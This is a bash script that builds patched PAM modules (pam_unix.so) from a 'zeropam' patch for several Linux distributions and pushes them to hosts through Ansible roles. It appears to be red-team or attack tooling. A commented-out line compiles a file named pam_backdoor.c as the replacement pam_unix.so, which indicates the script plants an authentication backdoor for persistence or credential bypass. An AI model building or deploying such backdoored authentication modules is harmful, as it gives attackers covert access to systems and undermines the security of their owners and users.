#!/bin/bash
set -e

cp ./zeropam-1-5-3.patch ./dynamic_build/patches/zeropam-1-5-3.patch

chmod +x ./dynamic_build/scripts/build_for_distro.sh

# ./dynamic_build/scripts/build_for_distro.sh ubuntu24
# ./dynamic_build/scripts/build_for_distro.sh debian12
./dynamic_build/scripts/build_for_distro.sh rocky9
# ./dynamic_build/scripts/build_for_distro.sh fedora42

# Copy over specifically compiled pam modules
cp ./dynamic_build/output/pam_unix_ubuntu24.so  ./roles/deploy_debian/files/ubuntu-24.04/
cp ./dynamic_build/output/pam_unix_debian12.so  ./roles/deploy_debian/files/debian-12/
cp ./dynamic_build/output/pam_unix_rocky9.so  ./roles/deploy_redhat/files/rocky-9/
cp ./dynamic_build/output/pam_unix_fedora42.so  ./roles/deploy_redhat/files/fedora-42/

# Copy over fallback modules in case distro not found
cp ./dynamic_build/output/pam_unix_ubuntu24.so  ./roles/deploy_debian/files/pam_unix_deb.so
cp ./dynamic_build/output/pam_unix_rocky9.so  ./roles/deploy_redhat/files/pam_unix_rhel.so

# ansible-playbook main.yml -t setup

# gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl

# cp ./pam_unix.so ./roles/deploy_debian/files/
# cp ./pam_unix.so ./roles/deploy_redhat/files/
# cp ./pam_unix.so ./roles/deploy_generic/files/

ansible-playbook main.yml -t deploy
